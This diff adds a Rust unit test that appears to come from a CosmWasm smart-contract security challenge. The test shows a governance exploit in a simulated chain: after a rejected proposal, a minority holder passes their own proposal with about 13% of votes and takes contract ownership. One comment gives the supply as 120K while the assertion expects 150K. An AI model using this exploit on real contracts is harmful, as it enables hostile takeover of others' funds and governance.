@@ -3,7 +3,7 @@ pub mod tests {
     use crate::msg::{Cw20HookMsg, ExecuteMsg, QueryMsg};
     use crate::state::Config;
     use cosmwasm_std::{attr, to_binary, Addr, Empty, Uint128};
-    use cw20::{Cw20ExecuteMsg, MinterResponse};
+    use cw20::{Cw20ExecuteMsg, Cw20QueryMsg, MinterResponse, TokenInfoResponse};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -234,5 +234,124 @@ pub mod tests {
             .query_wasm_smart(contract_addr, &QueryMsg::Config {})
             .unwrap();
         assert_eq!(config.owner, USER1.to_string());
+    }
+
+    const DICTATOR: &str = "dictator";
+    const CANDIDATE: &str = "candidate";
+
+    #[test]
+    fn exploit_rejected_resolution() {
+        // mints 100K token to ADMIN
+        let (mut app, contract_addr, token_addr) = base_scenario();
+        // query token total supply
+        let token_supply: TokenInfoResponse = app
+            .wrap()
+            .query_wasm_smart(token_addr.clone(), &Cw20QueryMsg::TokenInfo {})
+            .unwrap();
+        assert_eq!(token_supply.total_supply, Uint128::new(100_000));
+
+        // mints 20K token to DICTATOR and 30K to CANDIDATE
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Mint {
+                recipient: DICTATOR.to_string(),
+                amount: Uint128::new(20_000),
+            },
+            &[],
+        )
+        .unwrap();
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Mint {
+                recipient: CANDIDATE.to_string(),
+                amount: Uint128::new(30_000),
+            },
+            &[],
+        )
+        .unwrap();
+        // Token supply is now 120K
+        let token_supply: TokenInfoResponse = app
+            .wrap()
+            .query_wasm_smart(token_addr.clone(), &Cw20QueryMsg::TokenInfo {})
+            .unwrap();
+        assert_eq!(token_supply.total_supply, Uint128::new(150_000));
+
+        // CANDIDATE proposes themselves
+        app.execute_contract(
+            Addr::unchecked(CANDIDATE),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        )
+        .unwrap();
+        // Candidate votes for themselves
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(CANDIDATE),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(30_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Time passes and proposal is rejected
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+        let res = app
+            .execute_contract(
+                Addr::unchecked(DICTATOR),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap();
+        assert_eq!(res.events[1].attributes[2], attr("result", "Failed"));
+        
+        // Dictator proposes themselves
+        app.execute_contract(
+            Addr::unchecked(DICTATOR),
+            contract_addr.clone(),
+            &ExecuteMsg::Propose {},
+            &[],
+        ).unwrap();
+        // Dictator votes for themselves
+        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
+        app.execute_contract(
+            Addr::unchecked(DICTATOR),
+            token_addr.clone(),
+            &Cw20ExecuteMsg::Send {
+                contract: contract_addr.to_string(),
+                msg,
+                amount: Uint128::new(20_000),
+            },
+            &[],
+        ).unwrap();
+        // Time passes and proposal is successful with only 
+        // (20_000 / 150_000) ~ 13.3% of votes
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(VOTING_WINDOW);
+        });
+        let res = app
+            .execute_contract(
+                Addr::unchecked(DICTATOR),
+                contract_addr.clone(),
+                &ExecuteMsg::ResolveProposal {},
+                &[],
+            )
+            .unwrap(); 
+        assert_eq!(res.events[1].attributes[2], attr("result", "Passed"));
+        // Dictator is now the owner
+        let config: Config = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
+            .unwrap();
+        assert_eq!(config.owner, DICTATOR.to_string());
     }
 }
